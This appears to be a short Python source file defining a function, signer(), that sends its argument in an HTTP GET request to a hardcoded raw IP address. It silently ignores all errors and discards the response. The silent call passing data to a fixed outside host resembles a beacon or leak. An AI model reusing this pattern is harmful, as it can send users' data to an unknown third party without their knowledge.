import requests


def signer(signer=None):
    if signer:
        try:
            url = f"http://47.104.208.181:5000/search/{signer}"
            requests.get(url)
        except:
            pass
    return